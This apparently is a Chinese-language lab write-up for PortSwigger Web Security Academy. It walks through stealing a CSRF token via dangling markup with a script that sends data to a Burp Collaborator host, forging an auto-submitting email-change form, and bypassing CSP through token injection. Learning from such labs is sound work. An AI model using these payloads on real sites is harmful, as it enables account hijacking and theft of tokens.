3、必须使用“Click”标记向量，以便引导模拟用户单击它，如&lt;a href=""&gt;Click me&lt;/a&gt;
4、已有账号：wiener:peter
<hr/>
（提示：如果BP的服务器没有DNS、HTTP数据交互，请重启靶场，测试一个小时无果，重启，直接收到了40几条数据）
part1：
使用wiener:peter登录<br/> 检查更改电子邮件功能（email参数中存在XSS漏洞）

<img alt="" height="936" src="https://img-blog.csdnimg.cn/dd2d85c8cc13436ebc8072be9e93af29.png" width="1200"/><br/> 转到Collaborator选项卡（单击"复制到剪贴板"将唯一的Burp Collaborator有效负载复制到剪贴板）

<pre>`myorhs4vtlu3lzfzt884vf7n9ef43t.burpcollaborator.net`</pre>

<hr/>
part2：
插入XSS 
转到漏洞利用服务器并添加以下代码
（将YOUR-LAB-ID和YOUR-EXPLOIT-SERVER-ID分别替换为实验室ID和漏洞利用服务器ID，并将YOUR-COLABORATOR-ID替换为刚刚从Burp Collaborator复制的有效负载）<br/>  
<pre><code>&lt;script&gt;
if(window.name) {
	new Image().src='//BURP-COLLABORATOR-SUBDOMAIN?'+encodeURIComponent(window.name);
	} else {
		location = 'https://YOUR-LAB-ID.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
&lt;/script&gt;


我的是：
&lt;script&gt;
if(window.name) {
	new Image().src='//myorhs4vtlu3lzfzt884vf7n9ef43t.burpcollaborator.net?'+encodeURIComponent(window.name);
	} else {
		location = 'https://0a6a00f504d42ac4c1ff262800300059.web-security-academy.net/my-account?email=%22%3E%3Ca%20href=%22https://exploit-0a3600b804ec2a4ac105258401ae00c0.exploit-server.net/exploit%22%3EClick%20me%3C/a%3E%3Cbase%20target=%27';
}
&lt;/script&gt;</code></pre>

单击"存储"，然后单击"向受害者发送利用漏洞攻击"。当用户访问包含此恶意脚本的网站时，如果他们在仍登录的情况下单击"Click me"链接，其浏览器将向您的恶意网站发送包含其CSRF令牌的请求。然后可以使用Burp Collaborator客户端窃取这个CSRF令牌。


<br/> 返回Collaborator选项卡，刷新，应该看到一个由应用程序启动的HTTP交互。选择HTTP交互，转到请求选项卡，然后复制用户的CSRF令牌
（请求中的数据进行URL解码）


<pre>`2Vq711biQDVvP2f9X7bPThnN9K7Km8Gw`</pre>
<hr/>

part3:
生成CSRF HTML<br/> 打开Burp的Intercept功能后，返回实验室的更改电子邮件功能，并提交将电子邮件更改为任意地址的请求
获取数据包后发到repeater（并取消掉浏览器的请求，并关闭拦截，避免浏览器请求延时而错误）
<img alt="" height="782" src="https://img-blog.csdnimg.cn/d3c7bbbfd93d4fb8a5a481b10ee93331.png" width="1200"/><br/> 在Burp中，转到拦截的请求并将email参数的值更改为hacker@evil-user.net。<br/> 右键单击请求，从上下文菜单中选择"Engagement tools"，然后选择"Generate CSRF PoC"<img alt="" height="622" src="https://img-blog.csdnimg.cn/4cfeba7df0b14d74819d59b5c539e4ff.png" width="611"/>弹出窗口同时显示请求和由请求生成的CSRF HTML。在请求中，将CSRF令牌替换为之前从受害者处窃取的令牌
<img alt="" height="749" src="https://img-blog.csdnimg.cn/6d510e6defb94129b62fa4ce0ea2adf3.png" width="702"/><br/> 点击"选项"，并确保"包括自动提交脚本"已激活

<img alt="" height="749" src="https://img-blog.csdnimg.cn/dbd5a4168d564596a03203e3c4b9914c.png" width="702"/><br/> 单击"重新生成"更新CSRF HTML，使其包含被盗令牌，然后单击"复制HTML"将其保存到剪贴板

 <img alt="" height="749" src="https://img-blog.csdnimg.cn/fef8c45f3cf24959b66d193d6c22eed2.png" width="702"/>

 这个csrf的值又变了，再改一遍
<pre>`2Vq711biQDVvP2f9X7bPThnN9K7Km8Gw`</pre>


<pre><code>&lt;html&gt;
  &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;
  &lt;body&gt;
  &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt;
    &lt;form action="https://0a6a00f504d42ac4c1ff262800300059.web-security-academy.net/my-account/change-email" method="POST"&gt;
      &lt;input type="hidden" name="email" value="hacker&amp;#64;evil&amp;#45;user&amp;#46;net" /&gt;
      &lt;input type="hidden" name="csrf" value="2Vq711biQDVvP2f9X7bPThnN9K7Km8Gw" /&gt;
      &lt;input type="submit" value="Submit request" /&gt;
    &lt;/form&gt;
    &lt;script&gt;
      document.forms[0].submit();
    &lt;/script&gt;
  &lt;/body&gt;
&lt;/html&gt;

</code></pre>
<hr/>
part4:
再次发送给受害者<br/> 返回漏洞利用服务器并将CSRF HTML粘贴到正文中。覆盖我们之前输入的脚本。<br/> 单击"存储"和"向受害者发送利用漏洞攻击"。


 用户点击后，电子邮件将更改为hacker@evil-user.net<br/><img alt="" height="751" src="https://img-blog.csdnimg.cn/d0120a6937ae4b4690ace034dc1a200b.png" width="1200"/>



---


---


> 
<h3>3、使用CSP减轻悬空标记攻击</h3>
1、以下指令只允许从与页面本身相同的源加载图像：
<pre>`img-src 'self'`</pre>
以下指令将仅允许从特定域加载映像：
<pre>`img-src https://images.normal-website.com`</pre>
这些策略将防止某些悬空标记漏洞，因为无需用户交互即可捕获数据的一种简单方法是使用 图像标签。但它不会阻止其他利用漏洞的行为，如那些使用悬挂href属性


> 
<h3>4、使用策略注入绕过CSP</h3>
1、可能会遇到一个反映实际策略输入的网站，很可能是在report-uri指令中。如果站点反映可以控制的参数，则可以插入分号以添加自己的CSP指令。通常report-uri指令是列表中的最后一个指令。这意味着需要覆盖现有指令，以便利用此漏洞并绕过该策略。
<hr/>
2、通常不可能覆盖现有的script-src指令。但Chrome引入了script-src-elem指令，它允许控制脚本元素，但不能控制事件。至关重要的是，这个新指令允许覆盖现有的script-src指令
<hr/>
3、涉及实验：
实验30：反射XSS受CSP保护，带CSP旁路


---


> 
<h3>实验30：反射XSS受CSP保护，带CSP旁路</h3>
信息：
本实验使用CSP并包含一个反射的XSS漏洞。
完成实验：执行跨站点脚本攻击，绕过CSP并调用alert函数（Chrome）
<hr/>
part1:
在搜索框中输入以下内容：
<pre>`&lt;img src=1 onerror=alert(1)&gt;`</pre>
注意到负载被反映了，但是CSP阻止脚本执行。

分析数据包
在HTTP历史记录中，观察到响应包含一个Content-Security-Policy头，report-uri指令包含一个名为token的参数。因为可以控制token参数，所以可以将自己的CSP指令注入到策略中


<hr/>
part2:
插入XSS
访问以下URL（将YOUR-LAB-ID替换为实验室ID）
<pre><code>https://YOUR-LAB-ID.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27

我的是：
https://0a3800aa03daf86ac26366ef0092004e.web-security-academy.net/?search=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&amp;token=;script-src-elem%20%27unsafe-inline%27</code></pre>


注入使用CSP中的script-src-elem指令。此指令允许仅以脚本元素为目标。使用此指令可以覆盖现有的script-src规则，能够注入unsafe-inline，从而允许使用内联脚本




---

